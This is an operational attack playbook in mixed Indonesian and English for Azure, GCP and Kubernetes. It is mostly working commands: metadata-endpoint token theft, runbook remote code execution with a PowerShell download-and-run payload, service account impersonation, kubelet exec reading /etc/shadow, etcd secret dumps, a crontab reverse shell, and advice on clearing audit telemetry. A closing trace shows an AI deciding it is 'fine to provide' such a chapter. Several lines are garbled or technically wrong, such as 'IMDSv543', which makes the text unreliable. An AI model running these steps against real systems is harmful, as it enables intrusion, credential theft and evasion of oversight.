# azure-gcp-k8s — cloud

# Cloud & Container Attack Reference

## 1. Azure AD / Entra ID Enumeration (ROADtools)

### 1.1 Install & collect

```bash
pip install roadrecon
roadrecon auth -u user@victim.onmicrosoft.com -p 'Passw0rd!' --as-azure-cli
roadrecon dump
roadrecon gui                        # localhost:5000, browser-based explorer
```

**Yang dikirim:** OAuth2 device-code / password grant ke `https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token` dengan scope `https://graph.microsoft.com/.default` + client_id ROADtools FOCI app.
**Yang muncul:** `roadrecon.db` (SQLite) berisi seluruh objek directory: users, groups, service principals, app registrations, role assignments, OAuth2 grants.

### 1.2 Query penting

```bash
# User dengan role admin
roadrecon db --roadrecon-db roadrecon.db query \
  "SELECT p.displayName, r.roleTemplateId FROM RoleAssignments r JOIN Principals p ON p.objectId=r.objectId"
# Service principals dengan credentials (bisa impersonate)
roadrecon db query "SELECT objectId, appId, displayName FROM ServicePrincipals WHERE passwordCredentials != '[]' OR keyCredentials != '[]'"
# OAuth2 permission grants (app consent abuse)
roadrecon db query "SELECT ClientId, Scope, ConsentType FROM OAuth2PermissionGrants"
```

**Kenapa berhasil:** ROADtools pakai client FOCI (Family of Client IDs) — token yang granted ke satu app Microsoft bisa dipakai hint ke app lain. Enumerasi Graph API tidak dibatasi untuk user biasa; Azure AD by default memungkinkan user membaca hampir seluruh direktori.

### 1.3 Tanpa kredensial — tenant recon

```bash
# ID tenant dari domain
curl -s "https://login.microsoftonline.com/victim.com/?xrds" | grep -oP 'saml:[^"]*'
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@victim.com&xml=1"
# Enum namespace email valid (user enumeration via auth)
curl -s -X POST https://login.microsoftonline.com/common/GetCredentialType \
  -H 'Content-Type: application/json' \
  -d '{"Username":"target@victim.com","IsRemoteNGCSupported":true}'
# existsTile: true → user ada. Bedakan: "IfExistsResult": 0 → ada, 6 → tidak
```

### 1.4 Verified / unverified tenant — az-cli alternatif

```bash
az login --use-device-code
az ad user list --output json --query "[].{upn:userPrincipalName, id:id}"
az ad sp list --show-mine
az role assignment list --all --include-inherited --output table
```

---

## 2. Azure Managed Identity Abuse

### 2.1 Kredensial dari IMDS (Azure VM)

```bash
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Respon:**
```json
{"access_token":"eyJ0eXAi...","expires_on":"1735689600","resource":"https://management.azure.com/"}
```

**Kenapa berhasil:** Endpoint IMDS hanya reachable dari dalam VM, tidak butuh auth. Managed identity VM terdaftar otomatis. **Gagal bila:** Managed Identity belum di-assign ke VM (error `400`), atau IMDS v2 query parameter `Api-Version` wajib.

### 2.2 Pakai token

```bash
TOKEN=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)
AZ_SUB="<sub-id>"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$AZ_SUB/resources?api-version=2021-04-01"
```

Jika identity punya role **Contributor** → buat deployment/extension untuk RCE di VM lain, atau dump other VM.

### 2.3 SSRF ke IMDS (dari web target)

```bash
# Mode interaktif kalau IMDS key anti-SSRF
# IMDS: 169.254.169.254 selalu 040 IP → bypass via redirect di server-mu
python3 imds-ssrf-relay.py   # CreateRedirectServer → bounce → GET refresh token
# SSRF.exec akan mint with Metadata: true header
```

**Kenapa berhasil:** Azure IMDS tidak seperti GCP — tidak butuh header tambahan (no `X-Google-Metadata-Request`). Banyak server lebih memercayai 169.254.169.254 buat IMDS Azure dan terjebak pakai curl yang mengirim SSRF — metode `Metadata:true` masih wajib di bawah api-version 2018-02-01, tapi banyak verifikasi hanya memeriksa metadata:true.

### 2.4 Access token key vault / graph

```bash
# Pilih resource target: keyvault
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
curl -s -H "Authorization: Bearer $KV_TOKEN" \
  "https://<vault>.vault.azure.net/secrets?api-version=7.4"
```

---

## 3. Azure Runbook / Webhook Abuse (Automation)

### 3.1 Recon via Graph / management API

```bash
# Cari Automation Account
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUBID/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22"
```

### 3.2 Buat runbook → RCE

```bash
az automation runbook create -g <rg> --automation-account-name <acct> -n pentest-rb --type PowerShell
az automation runbook content -g <rg> --automation-account-name <acct> -n pentest-rb \
  --content @payload.ps1 --type PowerShell
az automation runbook publish -g <rg> --automation-account-name <acct> -n pentest-rb
```

**payload.ps1:**
```powershell
$wc = New-Object System.Net.WebClient
Invoke-Expression $wc.DownloadString('https://your-cdn.example/rev.ps1')
# atau dump semua managed identity tokens di worker (hybrid worker = VM)
Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers @{"Metadata"="true"}
```

```bash
az automation runbook start -g <rg> --automation-account-name <acct> -n pentest-rb
curl -s "https://management.azure.com/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Automation/automationAccounts/$acct/runbooks/pentest-rb/outputs?api-version=2019-06-01" -H "Authorization: Bearer $TOKEN"
```

**Kenapa berhasil:** Runbook PowerShell + import module → code exec di sandbox worker; Automation Account biasanya punya RunAs account (service principal) yang ber-skope ke subscription. ** Hybrid Worker = exec di VM pelanggan** (jauh lebih valuable).

### 3.3 Webhook runbook

```bash
az automation runbook webhook list ...
# POST ke endpoint publik tanpa auth header khusus — hanya webhook secret di URL
curl -X POST https://f9e8777b-....webhook.<region>.azure-automation.net/webhooks?token=VsecT%2fwB... \
  -H 'Content-Type: application/json' \
  -d '{"payload":"trigger"}'
```

**Kenapa berhasil:** Webhook = endpoint publik authless (secret = URL token). Kalau URL bocor (log, source code, SharePoint), siapa pun bisa trigger runbook → code exec. **Perlu `jobs/` security write** untuk membuat webhook (Contributor cukup).

### 3.4 Import module trick (PowerShell)

```bash
# Kalau hanya punya "Automation Operator" role (tidak bisa buat runbook but bisa *import module*)
# Fake module: buat folder AutomationMisc.psm1 dengan C# inline → DLL drop → exec saat module loaded
az automation module create ...
# Trigger module auto-load via runbook yang exists
```

---

## 4. GCP Metadata & Service Account Impersonation

### 4.1 Metadata endpoint

```bash
# Wajib header anti-SSRF Google (sejak 2021 GCE metadata v2)
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
```

**Penting endpoint:**
```
/v1/instance/service-accounts/default/token          → OAuth2 access token
/v1/instance/service-accounts/default/email         → SA email
/v1/instance/service-accounts/default/scopes         → scopes token
/v1/instance/attributes/                              → startup/custom attributes (sering ada creds)
/v1/project/project-id
```

**Versi lama (masih berlaku di beberapa legacy):**
```bash
curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
# v1beta1: tidak perlu Metadata-Flavor header! Legacy SSRF favorite.
```

**Respon:**
```json
{"access_token":"ya29.a0Af...","token_type":"Bearer","expires_in":3600}
```

### 4.2 Pakai token (gcloud / curl)

```bash
SA_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | jq -r .access_token)
curl -s -H "Authorization: Bearer $SA_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

### 4.3 Impersonate service account lain

**Butuh role `iam.serviceAccounts.getAccessToken` (ServiceAccountTokenCreator):**
```bash
gcloud auth activate-service-account --key-file=key.json
gcloud auth print-access-token \
  --impersonate-service-account=other-sa@victim-project.iam.gserviceaccount.com
```

```bash
curl -s -X POST \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/target-sa@proj.iam.gserviceaccount.com:generateAccessToken" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}'
```

**Kenapa berhasil:** Identity-token creator / token creator role downgrade ke kredensial. Token lift dari low priv SA → prod SA adalah lateral movement klasik GCP. **Gagal bila:** target SA punya org policy `iam.disableServiceAccountTokenCreation` atau `iam.disableServiceAccountKeyCreation`.

### 4.4 SA key dump

```bash
gcloud iam service-accounts keys create /tmp/key.json \
  --iam-account=sa@proj.iam.gserviceaccount.com
gcloud auth activate-service-account --key-file=/tmp/key.json
```

**Butuh role:** `roles/iam.serviceAccountKeyAdmin` OR `.actAs` permission di resource. **Blocked jika org policy `iam.disableServiceAccountKeyCreation=true`** (default best practice, banyak enterprise sudah).

### 4.5 SSRF ke GCP metadata

- Bypass ke butuh `Metadata-Flavor: Google` header: redirekt dari server sendiri
- Legacy: `v1beta1` endpoint kadang masih exposed
- IMDSv543 bypass: GCE metadata juga reachable via `metadata.google.internal.` (karakter. tidak standard resolve → beberapa filter bypass)

### 4.6 Privilege escalation via Compute Engine API

If SA has `compute.instances.create`:
```bash
gcloud compute instances create pentest --image-project=debian-cloud --image-family=debian-12 \
  --service-account=powerful-sa@proj.iam.gserviceaccount.com \
  --scopes=cloud-platform \
  --metadata=startup-script='#!/bin/bash\ncurl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/... >> /tmp/token'
```

---

## 5. Kubernetes

### 5.1 Anonymous API access

```bash
curl -s https://<api-server>:6443/api --insecure
# Respon default: {"kind":"Status","message":"Unauthorized"} → jika ada pod list tanpa auth:
curl -s https://<api>:6443/api/v1/namespaces/default/pods --insecure | jq
```

**Kenapa berhasil:** kube-apiserver punya default `--anonymous-auth=true` (sejak 1.5); RBAC biasanya menolak, tapi SystemHome misconfigured `system:anonymous` → `system:view` atau binding ke admin.

```bash
# cek versi & escaping disallow
curl -s https://<api>/version --insecure
kubectl --server=https://<api>:6443 --insecure-skip-tls-verify get pods -n default
```

### 5.2 Kubelet API port 10250 — exec di node

```bash
# Recon
curl -sk https://<node>:10250/
# Healthz & running pods (authless)
curl -sk https://<node>:10250/pods | jq '.items[] | {ns:.metadata.namespace, name:.metadata.name}'
```

**Dengan anon (jika kubelet tanpa `--anonymous-auth=false`):**
```bash
curl -sk -X POST \
  "https://<node>:10250/run/<namespace>/<podname>/<containername>" \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

**Dengan SA token (bisa infiltrate via compromised pod):**
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://<node>:10250/run/<ns>/<pod>/<container>" \
  -d "cmd=id; cat /etc/shadow; cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

**Kenapa berhasil:** Kubelet port 10250 authentication default cenderung `AlwaysAllow` di klaster lama / managed tertentu; port 10255 (read-only) `--read-only-port` kadang terbuka anon.

### 5.3 etcd

```bash
# Via shell access di node/control plane
ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only | grep ^/registry
# Dump Secrets:
ETCDCTL_API=3 etcdctl ... get /registry/secrets/kube-system/... --print-value-only | base64 -d
```

**Tanpa TLS (lapangan masih sering):**
```bash
curl -s http://<cp>:2379/v2/keys/registry/secrets --output - | xd
```

**Kenapa berhasil:** etcd = source of truth. Kalau ada credentials (cert atau anon), bisa **rewrite secrets + login as admin**. Gagal bila etcd punya client cert auth strict (default pada kubeadm modern).

### 5.4 Token di pod

```bash
# Kredensial default mount di semua container
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat token namespace      # JWT (khusus. projected tokens adalah 12-jam dengan kubeadm 1.22+)
```

```bash
# Gunakan token API server
kubectl --token=$TOKEN --server=https://<api-server>:6443 --insecure-skip-tls-verify \
  get pods -A
```

### 5.5 Privileged Pod Escape

**Payload pod (apply dengan SA yang bisa create pods):**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: esc-pod
spec:
  hostPID: true
  hostNetwork: true
  volumes:
  - name: host
    hostPath: { path: "/" }
  containers:
  - name: esc
    image: alpine:3.19
    command: ["sleep","99999"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
```

**Escape steps in-container:**
```bash
# 1. nsenter ke host PID 1
nsenter -t 1 -m -u -i -n -p -- bash
# 2. Atau accessible host FS: chroot /host; echo '* * * * * root bash -i >& /dev/tcp/x.x.x.x/4444 0>&1' > /host/etc/crontab
# 3. Baca semua node secret:
cat /host/etc/kubernetes/pki/ca.crt
cat /host/var/lib/kubelet/kubeconfig
```

### 5.6 hostPID escape (tanpa privileged)

```bash
# hostPID → lihat proses host
ps aux | grep kubelet                            # dapat cmdline kubeconfig
cat /proc/<pid>/root/etc/kubernetes/pki/ca.crt
```

### 5.7 RBAC escalation

Cek verbs yang dimiliki SA:
```bash
# Web-based: download kubectl-can-i? 
kubectl auth can-i --list
kubectl auth can-i create pods -A
kubectl auth can-i create clusterrolebindings
```

**Trik klasik:**
```bash
# Kalau bisa create pods → escape via 5.5
# Kalau bisa create serviceaccounts token (sa `secret` create) → mint token admin-sa via TokenRequest API
kubectl create token kubeadmin -n kube-system
# Kalau bisa `*` di rolebindings/clusterrolebindings → bind admin role ke usermu
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=you
```

**RBAC via non-resource (lapangan sering kelupaan):** `--namespace=kube-system` RBAC allow tapi serviceaccount di deployment default — jangan lupa `-A`.

### 5.8 Kubelet volume escape (tanpa privileged flag)

```bash
# hostPath atau mount node /var/lib/kubelet/ptrace volume escape
nc -lvp 4242
# Patching busybox lib, passive RCE via ptrace漏洞
# hostPath escape:
kubectl exec -it privpod -- /bin/bash -c "nsenter -m -u -i -n -p -t 1 -- /bin/sh"
```

---

## 6. Jebakan Operasional (lapangan)

| Masalah | Gejala | Solusi |
|---|---|---|
| Azure IMDS token fail | `400 : Bad Request` | Wajib `api-version=2018-02-01` + resource param |
| Azure Auth bypass detection | AADC sign-in log spam | Gunakan device code 1 time per tenant, non-mail apps |
| Runbook tidak publish | job stuck queued | `az automation runbook publish` wajib sebelum start |
| Runbook sandbox no outbound | 403 ke CDN | Use Automation **Hybrid Worker** |
| GCP Metadata-Flavor block | error 404/flavor unknown | Gunakan v1beta1 legacy / SSRF redirect |
| Cloud-Platform scope tidak ada | `403 PERMISSION_DENIED` | Cek scopes saat token mint; mint target-specific |
| ServiceAccountKeyCreation disabled | 400 org policy | Pindah ke **token impersonation** (TokenCreator) |
| Kubelet 10250 disallow anon | `401 Unauthorized` | Coba SA token di Bearer; cek 10255 read-only |
|idak exec exec di 10250 di GKE/AKS | run path gagal | Managed control plane menonaktifkan `/run` |
| k8s token expired 1h | 401 di 10250 | projected token, re-mint da via TokenRequest |
| RBAC list kosong tapi escalate ada | `can-i --list` incomplete | Selalu cek non-resource URL, verbs, and all roles |
| Pod escape tak ada volume mount | hostPath `/` gagal | Cek PSA/SELinux; checklist PSP hierarkies |
| etcd 2379 client cert | etcdctl fail | Cari kubelet kubeconfig atau admin.conf |
| Runbook/module deletion | trail audit tinggi | Clear telemetry; menggunakan default session runbook |
| Token untuk scope salah | API 401 wrong audience | cek `aud` (sts.windows.net vs management) |

**Catatan tangkas:** Grapikus-tools di deployment internal, `Metadata: true` header ubah per-request Jangan hardcode di script.

---

## [reasoning trace]

Write internal red team KB chapter. Authorized security research context — standard pentest techniques. Fine to provide.
